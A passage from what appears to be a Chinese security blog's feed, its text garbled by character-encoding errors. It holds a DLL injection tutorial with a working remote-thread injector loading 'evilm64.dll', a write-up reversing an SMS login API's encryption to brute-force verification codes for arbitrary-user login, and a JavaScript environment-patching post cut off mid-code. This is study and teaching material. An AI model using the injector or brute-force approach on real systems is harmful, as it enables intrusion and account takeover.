    <content type="html"><![CDATA[<h1 id="DLL-Injection"><a href="#DLL-Injection" class="headerlink" title="DLL Injection"></a>DLL Injection</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection">https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection</a></p><p>è¿™ç§æ‰‹æ³•æ˜¯å°† DLL æ³¨å…¥è¿œç¨‹è¿›ç¨‹ã€‚ä¼—æ‰€å‘¨çŸ¥dllå°±æ˜¯ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œæ¯”å¦‚kernel32.dllï¼Œé‡Œé¢åŒ…å«å¾ˆå¤šå‡½æ•°ä¾›æˆ‘ä»¬ä½¿ç”¨ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104221312522.png" alt="image-20251104221312522"></p><p>vsåˆ›å»ºä¸€ä¸ªdllé¡¹ç›®ä¹‹åï¼Œç»™æˆ‘ä»¬çš„ä»£ç æ˜¯å¦‚ä¸‹</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104221750916.png" alt="image-20251104221750916"></p><p>ä¸‹é¢æ˜¯æ¸…æ¥šåœ°æ³¨é‡Š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span>  <span class="comment">// é¢„ç¼–è¯‘å¤´æ–‡ä»¶ï¼ŒåŒ…å«å¸¸ç”¨çš„ Windows API å¤´æ–‡ä»¶</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * DllMain - DLL å…¥å£ç‚¹å‡½æ•°</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * è¿™æ˜¯ Windows DLL çš„ä¸»å…¥å£å‡½æ•°ï¼Œå½“ DLL è¢«åŠ è½½ã€å¸è½½æˆ–çº¿ç¨‹åˆ›å»º/é”€æ¯æ—¶ä¼šè¢«è°ƒç”¨</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param hModule          - å½“å‰ DLL æ¨¡å—çš„å¥æŸ„ï¼ˆå¯ä»¥ç†è§£ä¸º DLL çš„æ ‡è¯†ç¬¦ï¼‰</span></span><br><span class="line"><span class="comment"> * @param ul_reason_for_call - è°ƒç”¨åŸå› ï¼ˆä¸ºä»€ä¹ˆè°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼‰</span></span><br><span class="line"><span class="comment"> * @param lpReserved       - ä¿ç•™å‚æ•°ï¼ˆé€šå¸¸ä¸ä½¿ç”¨ï¼‰</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @return TRUE  - è¡¨ç¤ºåˆå§‹åŒ–æˆåŠŸ</span></span><br><span class="line"><span class="comment"> * @return FALSE - è¡¨ç¤ºåˆå§‹åŒ–å¤±è´¥ï¼ˆDLL ä¼šè¢«å¸è½½ï¼‰</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">(HMODULE hModule,</span></span><br><span class="line"><span class="params">                      DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                      LPVOID lpReserved)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// æ ¹æ®ä¸åŒçš„è°ƒç”¨åŸå› æ‰§è¡Œä¸åŒçš„æ“ä½œ</span></span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="comment">// å½“ DLL ç¬¬ä¸€æ¬¡è¢«æŸä¸ªè¿›ç¨‹åŠ è½½æ—¶è°ƒç”¨ï¼ˆåªè°ƒç”¨ä¸€æ¬¡ï¼‰</span></span><br><span class="line">        <span class="comment">// é€‚åˆåšåˆå§‹åŒ–å·¥ä½œï¼š</span></span><br><span class="line">        <span class="comment">//   - åˆ†é…å†…å­˜</span></span><br><span class="line">        <span class="comment">//   - åˆå§‹åŒ–å…¨å±€å˜é‡</span></span><br><span class="line">        <span class="comment">//   - åˆ›å»ºäº’æ–¥é”</span></span><br><span class="line">        <span class="comment">//   - æ‰“å¼€æ–‡ä»¶/æ•°æ®åº“è¿æ¥</span></span><br><span class="line">        <span class="comment">// ç¤ºä¾‹ï¼š</span></span><br><span class="line">        <span class="comment">// MessageBox(NULL, &quot;DLL å·²åŠ è½½åˆ°è¿›ç¨‹&quot;, &quot;æç¤º&quot;, MB_OK);</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">        <span class="comment">// å½“è¿›ç¨‹åˆ›å»ºä¸€ä¸ªæ–°çº¿ç¨‹æ—¶è°ƒç”¨ï¼ˆé™¤äº†ç¬¬ä¸€ä¸ªçº¿ç¨‹ï¼‰</span></span><br><span class="line">        <span class="comment">// é€‚åˆåšçº¿ç¨‹ç›¸å…³çš„åˆå§‹åŒ–å·¥ä½œï¼š</span></span><br><span class="line">        <span class="comment">//   - åˆ†é…çº¿ç¨‹å±€éƒ¨å­˜å‚¨ï¼ˆTLSï¼‰</span></span><br><span class="line">        <span class="comment">//   - åˆå§‹åŒ–çº¿ç¨‹ç‰¹å®šçš„æ•°æ®</span></span><br><span class="line">        <span class="comment">// æ³¨æ„ï¼šä¸»çº¿ç¨‹ä¸ä¼šè§¦å‘è¿™ä¸ªï¼Œåªæœ‰åç»­åˆ›å»ºçš„çº¿ç¨‹æ‰ä¼š</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">        <span class="comment">// å½“çº¿ç¨‹æ­£å¸¸é€€å‡ºæ—¶è°ƒç”¨ï¼ˆé™¤äº†æœ€åä¸€ä¸ªçº¿ç¨‹ï¼‰</span></span><br><span class="line">        <span class="comment">// é€‚åˆåšçº¿ç¨‹æ¸…ç†å·¥ä½œï¼š</span></span><br><span class="line">        <span class="comment">//   - é‡Šæ”¾çº¿ç¨‹å±€éƒ¨å­˜å‚¨</span></span><br><span class="line">        <span class="comment">//   - æ¸…ç†çº¿ç¨‹ç‰¹å®šçš„èµ„æº</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="comment">// å½“ DLL ä»è¿›ç¨‹ä¸­å¸è½½æ—¶è°ƒç”¨ï¼ˆåªè°ƒç”¨ä¸€æ¬¡ï¼‰</span></span><br><span class="line">        <span class="comment">// é€‚åˆåšæ¸…ç†å·¥ä½œï¼š</span></span><br><span class="line">        <span class="comment">//   - é‡Šæ”¾åˆ†é…çš„å†…å­˜</span></span><br><span class="line">        <span class="comment">//   - å…³é—­æ–‡ä»¶å¥æŸ„</span></span><br><span class="line">        <span class="comment">//   - é‡Šæ”¾äº’æ–¥é”</span></span><br><span class="line">        <span class="comment">//   - å…³é—­æ•°æ®åº“è¿æ¥</span></span><br><span class="line">        <span class="comment">// ç¤ºä¾‹ï¼š</span></span><br><span class="line">        <span class="comment">// MessageBox(NULL, &quot;DLL å³å°†å¸è½½&quot;, &quot;æç¤º&quot;, MB_OK);</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è¿”å› TRUE è¡¨ç¤º DLL åˆå§‹åŒ–æˆåŠŸ</span></span><br><span class="line">    <span class="comment">// å¦‚æœè¿”å› FALSEï¼ŒDLL ä¼šè¢«ç«‹å³å¸è½½</span></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨dllmainä¸‹é¢å‡½æ•°é‡Œé¢åŠ å‡ ä¸ªå¼¹çª—ï¼Œå†åŠ å‡ ä¸ªå¯¼å‡ºå‡½æ•°ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104222335220.png" alt="image-20251104222335220"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104222349886.png" alt="image-20251104222349886"></p><p>æˆ‘è¿™é‡Œä½¿ç”¨cff exploreræŸ¥çœ‹å¯¼å‡ºè¡¨ï¼Œå¯ä»¥çœ‹åˆ°å†™çš„å¯¼å‡ºå‡½æ•°ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104222924255.png" alt="image-20251104222924255"></p><p>å†™ä¸€è¡ŒåŠ è½½å™¨ï¼Œç”¨åˆ°äº†LoadLibraryAï¼Œå°±æ˜¯åŠ è½½å™¨ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104223345999.png" alt="image-20251104223345999"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104223325982.png" alt="image-20251104223325982"></p><p>å½“æ‰§è¡ŒLoadLibraryAçš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘è¿™ä¸ªDLL_PROCESS_ATTACHï¼Œé‚£ä¹ˆæˆ‘å†™æ¶æ„dllçš„æ—¶å€™ï¼Œå°±å†™åœ¨è¿™ä¸ªcaseé‡Œé¢ï¼Œ é‚£ä¹ˆå¦‚æœåœ¨åˆ«çš„è¿›ç¨‹é‡Œæ‰§è¡Œä¸€ä¸‹è¿™ä¸ªLoadLibraryæ˜¯ä¸æ˜¯ç›´æ¥å°±è§¦å‘dllé‡Œé¢å†™çš„ä¸Šçº¿ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬æ¥çœ‹å‚è€ƒç½‘ç«™é‡Œé¢ä»–çš„å†™æ³•ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">HANDLE processHandle;</span><br><span class="line">PVOID remoteBuffer;</span><br><span class="line"><span class="type">wchar_t</span> dllPath[] = TEXT(<span class="string">&quot;C:\\experiments\\evilm64.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Injecting DLL to PID: %i\n&quot;</span>, atoi(argv[<span class="number">1</span>]));</span><br><span class="line">processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[<span class="number">1</span>])));</span><br><span class="line">remoteBuffer = VirtualAllocEx(processHandle, <span class="literal">NULL</span>, <span class="keyword">sizeof</span> dllPath, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, <span class="keyword">sizeof</span> dllPath, <span class="literal">NULL</span>);</span><br><span class="line">PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;Kernel32&quot;</span>)), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">CreateRemoteThread(processHandle, <span class="literal">NULL</span>, <span class="number">0</span>, threatStartRoutineAddress, remoteBuffer, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">CloseHandle(processHandle); </span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ€è·¯å°±æ˜¯æŠŠdllå†™å…¥è¿›ç¨‹çš„ä¸€ä¸ªå¼€è¾Ÿçš„ç©ºé—´å†…ï¼Œç„¶ååˆ›å»ºçº¿ç¨‹ä½¿ç”¨LoadLibraryå‡½æ•°å³å¯ã€‚</p><p>æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹å…³é”®çš„CreateRemoteThreadå‡½æ•°ï¼Œè¿™ä¸ªçœ‹åå­—å°±çŸ¥é“æ˜¯åˆ›å»ºè¿œç¨‹çº¿ç¨‹ï¼Œå®˜ç½‘æœä¸€ä¸‹çœ‹ä¸€ä¸‹å‚æ•°ï¼Œä¹‹åé‡åˆ°ä¸ä¼šçš„å‡½æ•°ä¹Ÿå»ºè®®ç›´æ¥æœå®˜ç½‘ï¼Œç„¶åæ ¹æ®AIäº†è§£å³å¯ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104232857827.png" alt="image-20251104232857827"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DLL-Injection&quot;&gt;&lt;a href=&quot;#DLL-Injection&quot; class=&quot;headerlink&quot; title=&quot;DLL Injection&quot;&gt;&lt;/a&gt;DLL Injection&lt;/h1&gt;&lt;p&gt;å‚è€ƒæ–‡ç« ï¼š&lt;a href=&quot;https://www.</summary>
      
    
    
    
    
    <category term="æ¶æ„ä»£ç åˆ†æç³»åˆ—è¯¾ç¨‹" scheme="https://250wuyifan.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>æ¶æ„ä»£ç åˆ†æç³»åˆ—è¯¾ç¨‹-ä»‹ç»</title>
    <link href="https://250wuyifan.github.io/2025/11/04/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-%E4%BB%8B%E7%BB%8D/"/>
    <id>https://250wuyifan.github.io/2025/11/04/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B-%E4%BB%8B%E7%BB%8D/</id>
    <published>2025-11-04T11:03:43.000Z</published>
    <updated>2025-11-04T14:10:29.096Z</updated>
    
    <content type="html"><![CDATA[<h1 id="è¯¾ç¨‹ä»‹ç»"><a href="#è¯¾ç¨‹ä»‹ç»" class="headerlink" title="è¯¾ç¨‹ä»‹ç»"></a>è¯¾ç¨‹ä»‹ç»</h1><p>é¦–å…ˆåšä¸€ä¸ªä»‹ç»å…³äºæ¶æ„ä»£ç åˆ†æè¯¾ç¨‹ï¼Œä»æœ€å¼€å§‹çš„å…æ€å­¦ä¹ åˆ°è¶Šæ¥è¶Šæ·±å…¥çš„å†…æ ¸å­¦ä¹ ï¼Œæ˜¯æ—¶å€™åšä¸€ä¸ªæ€»ç»“äº†ã€‚æ¶æ„ä»£ç åˆ†ææ˜¯ç›®å‰å®‰å…¨ä¸é”™çš„ä¸€ä¸ªå²—ä½ï¼Œä¹Ÿæ˜¯ç›¸æ¯”äºå®‰æœï¼Œç›®å‰å¸‚é¢ä¸Šwebå®‰å…¨çš„è¯¾ç¨‹ç¡®å®ä¸å°‘ï¼Œä½†æ˜¯å…³äºæ¶æ„ä»£ç åˆ†æè¿™ä¸€ä¸ªä¸“é¢˜ç¡®å®ä¸å¤šï¼Œæ‰€ä»¥æˆ‘ä¼šåœ¨è¿™é—¨è¯¾ç¨‹åšä¸€ä¸ªæ€»ç»“ï¼Œå¸Œæœ›å¯¹å­¦ä¹ è¿™å—çŸ¥è¯†çš„å¤§å®¶åœ¨è·¯çº¿ä¸Šæœ‰ä¸€ä¸ªå¸®åŠ©ã€‚</p><p>åœ¨ä¹‹åçš„è¯¾ç¨‹ä¸­ï¼Œé€æ­¥ä»‹ç»ï¼Œé€æ­¥æ·±å…¥ï¼Œä»ç®€å…¥æ·±ï¼Œèåˆæ‰€æœ‰çš„ç›¸å…³çŸ¥è¯†ï¼Œåšåˆ°é¢é¢ä¿±åˆ°ï¼Œç´§è·ŸæŠ€æœ¯å‘å±•æ½®æµï¼Œä»ä¸åŒçš„æ”»å‡»æ‰‹æ³•åˆ°ç›¸åº”çš„é˜²å¾¡æ‰‹æ³•ã€‚ï¼ˆæˆ‘çš„æ¢¦æƒ³ï¼‰</p><p>è¿™å—å…ˆä¸å†™ï¼Œå› ä¸ºå†™ä½œçš„é¡ºåºä¹Ÿæ˜¯çœ‹æˆ‘çš„æƒ³æ³•ï¼Œå…ˆé€æ­¥å†™ï¼Œç„¶åå†å®Œå–„ç›®å½•ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;è¯¾ç¨‹ä»‹ç»&quot;&gt;&lt;a href=&quot;#è¯¾ç¨‹ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;è¯¾ç¨‹ä»‹ç»&quot;&gt;&lt;/a&gt;è¯¾ç¨‹ä»‹ç»&lt;/h1&gt;&lt;p&gt;é¦–å…ˆåšä¸€ä¸ªä»‹ç»å…³äºæ¶æ„ä»£ç åˆ†æè¯¾ç¨‹ï¼Œä»æœ€å¼€å§‹çš„å…æ€å­¦ä¹ åˆ°è¶Šæ¥è¶Šæ·±å…¥çš„å†…æ ¸å­¦ä¹ ï¼Œæ˜¯æ—¶å€™åšä¸€ä¸ªæ€»ç»“äº†ã€‚æ¶æ„ä»£ç åˆ†ææ˜¯ç›®å‰å®‰å…¨ä¸é”™</summary>
      
    
    
    
    
    <category term="æ¶æ„ä»£ç åˆ†æç³»åˆ—è¯¾ç¨‹" scheme="https://250wuyifan.github.io/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E8%AF%BE%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>jsé€†å‘-å®ç°æŸçŸ­ä¿¡æ¥å£å‚æ•°åŠ å¯†</title>
    <link href="https://250wuyifan.github.io/2025/11/04/js%E9%80%86%E5%90%91-%E5%AE%9E%E7%8E%B0%E6%9F%90%E7%9F%AD%E4%BF%A1%E6%8E%A5%E5%8F%A3%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86/"/>
    <id>https://250wuyifan.github.io/2025/11/04/js%E9%80%86%E5%90%91-%E5%AE%9E%E7%8E%B0%E6%9F%90%E7%9F%AD%E4%BF%A1%E6%8E%A5%E5%8F%A3%E5%8F%82%E6%95%B0%E5%8A%A0%E5%AF%86/</id>
    <published>2025-11-04T07:10:44.000Z</published>
    <updated>2025-11-04T08:18:26.596Z</updated>
    
    <content type="html"><![CDATA[<p>é¡µé¢å¦‚ä¸‹ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104151220569.png" alt="image-20251104151220569"></p><p>ç‚¹å‡»è·å–éªŒè¯ç ï¼Œåªæœ‰ä¸€ä¸ªç½‘ç»œè¯·æ±‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104151325309.png" alt="image-20251104151325309"></p><p>burpæ‹¦æˆª</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104151418820.png" alt="image-20251104151418820"></p><p>å‚æ•°mobileåŠ å¯†ï¼Œå¤´éƒ¨è¿˜æœ‰ä¸€ä¸ªSignã€‚è¿™æ˜¯æˆ‘ä»¬è¦é€†å‘çš„ä¸¤ä¸ªç‚¹ã€‚</p><p>é¦–å…ˆçœ‹åˆ°è¯·æ±‚åŠ å¯†ä¹‹åï¼Œæ”¾åˆ°äº†jsonä¸­ï¼Œæƒ³åˆ°äº†hookä¸€ä¸‹jsonçš„å¤„ç†ã€‚</p><p>å‚è€ƒæˆ‘çš„<a href="https://250wuyifan.github.io/2025/10/28/js%E9%80%86%E5%90%91-%E6%9F%90%E6%9F%90%E6%9C%8D%E5%8A%A1%E4%B8%AD%E5%BF%83%E5%AE%9A%E7%82%B9%E6%9F%A5%E8%AF%A2webpack%E9%80%86%E5%90%91/">https://250wuyifan.github.io/2025/10/28/js%E9%80%86%E5%90%91-%E6%9F%90%E6%9F%90%E6%9C%8D%E5%8A%A1%E4%B8%AD%E5%BF%83%E5%AE%9A%E7%82%B9%E6%9F%A5%E8%AF%A2webpack%E9%80%86%E5%90%91/</a></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104151553062.png" alt="image-20251104151553062"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104151900187.png" alt="image-20251104151900187"></p><p>æ–­ç‚¹äº†ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104152140635.png" alt="image-20251104152140635"></p><p>è·Ÿå †æ ˆï¼Œä½†æ²¡æœ‰å‘ç°æ˜æ˜¾çš„åŠ å¯†ç‚¹ã€‚</p><p>å…¨å±€æœç´¢å‚æ•°mobile:   éšä¾¿ä¸‹å‡ ä¸ªæ–­ç‚¹ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104152825232.png" alt="image-20251104152825232"></p><p>å‘ç°æ‹¦æˆªåˆ°äº†æ²¡æœ‰åŠ å¯†çš„æ—¶å€™ã€‚</p><p>ç‚¹å‡»æ­¥å…¥ï¼Œè·³åˆ°äº†å¦‚ä¸‹å‡½æ•°ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104152951619.png" alt="image-20251104152951619"></p><p>å‘ç°è¿™é‡ŒaesåŠ å¯†æ‰‹æœºå·ï¼Œä¸‹é¢è¿˜æœ‰åŠ å¯†signå€¼çš„é€»è¾‘ï¼Œè¿™é‡Œæˆ‘ä»¬äº¤ç»™AIï¼Œç›´æ¥å†™å¥½äº†è„šæœ¬ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104153320336.png" alt="image-20251104153320336"></p><p>æ¥ä¸‹æ¥å°±å¯ä»¥æŒ‰ç…§æµ‹è¯•éªŒè¯ç çš„å¥—è·¯æ¥è¿›è¡Œæµ‹è¯•äº†ï¼Œå› ä¸ºè¿™é‡Œæ˜¯å››ä½æ•°çš„éªŒè¯ç ï¼Œæˆ‘ä»¬é€‰æ‹©è‡ªå†™è„šæœ¬çˆ†ç ´ä¸€æ³¢ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ä»»æ„ç”¨æˆ·ç™»å½•ã€‚</p><p>å†™å¥½äº†ç™»å½•çš„è„šæ­¥ï¼Œä¹Ÿèƒ½è¯†åˆ«äº†éªŒè¯ç ï¼Œæ²¡æƒ³åˆ°ï¼ŒçŸ­ä¿¡æˆ‘ä»¥ä¸ºæ˜¯å››ä½æ•°ï¼Œç»“æœæ˜¯å…­ä½æ•°ï¼Œå´©æºƒäº†ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104160033265.png" alt="image-20251104160033265"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104160056138.png" alt="image-20251104160056138"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;é¡µé¢å¦‚ä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251104151220569.png&quot; alt=&quot;image-202511041</summary>
      
    
    
    
    <category term="JSé€†å‘" scheme="https://250wuyifan.github.io/categories/JS%E9%80%86%E5%90%91/"/>
    
    
    <category term="JSé€†å‘" scheme="https://250wuyifan.github.io/tags/JS%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>jsé€†å‘-ç ä¸Šçˆ¬-é¢˜åäºŒJSVMPå…¥é—¨é€†å‘è¡¥ç¯å¢ƒ</title>
    <link href="https://250wuyifan.github.io/2025/11/02/js%E9%80%86%E5%90%91-%E7%A0%81%E4%B8%8A%E7%88%AC-%E9%A2%98%E5%8D%81%E4%BA%8CJSVMP%E5%85%A5%E9%97%A8%E9%80%86%E5%90%91%E8%A1%A5%E7%8E%AF%E5%A2%83/"/>
    <id>https://250wuyifan.github.io/2025/11/02/js%E9%80%86%E5%90%91-%E7%A0%81%E4%B8%8A%E7%88%AC-%E9%A2%98%E5%8D%81%E4%BA%8CJSVMP%E5%85%A5%E9%97%A8%E9%80%86%E5%90%91%E8%A1%A5%E7%8E%AF%E5%A2%83/</id>
    <published>2025-11-02T07:06:29.000Z</published>
    <updated>2025-11-04T11:03:12.447Z</updated>
    
    <content type="html"><![CDATA[<p>é€†å‘ç‚¹åœ¨è¿™ä¸ªå‚æ•°çš„må€¼ï¼Œtæ˜¯æ—¶é—´æˆ³ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102151137802.png" alt="image-20251102151137802"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102151555082.png" alt="image-20251102151555082"></p><p>hookç½‘ç»œè¯·æ±‚æ–­ç‚¹ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102152739946.png" alt="image-20251102152739946"></p><p>è·Ÿå †æ ˆ</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102153040967.png" alt="image-20251102153040967"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102153358185.png" alt="image-20251102153358185"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102153643771.png" alt="image-20251102153643771"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102153837655.png" alt="image-20251102153837655"></p><p>è¡¥ä¸€ä¸ª</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102154149932.png" alt="image-20251102154149932"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102154209720.png" alt="image-20251102154209720"></p><p>åˆæŠ¥é”™ã€‚</p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102154234535.png" alt="image-20251102154234535"></p><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251102154517869.png" alt="image-20251102154517869"></p><p>è¿™ä¸ªæ—¶å€™ä¸Šä»£ç†ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ProxyDocumentObjects</span>(<span class="params">proxyObjs</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; proxyObjs.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> documentObj = proxyObjs[i];</span><br><span class="line">        <span class="keyword">const</span> keys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(documentObj);</span><br><span class="line">        keys.<span class="title function_">forEach</span>(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> value = documentObj[key];</span><br><span class="line">            <span class="keyword">if</span> (value &amp;&amp; <span class="keyword">typeof</span> value === <span class="string">&quot;object&quot;</span>) &#123;</span><br><span class="line">                documentObj[key] = <span class="keyword">new</span> <span class="title class_">Proxy</span>(value, 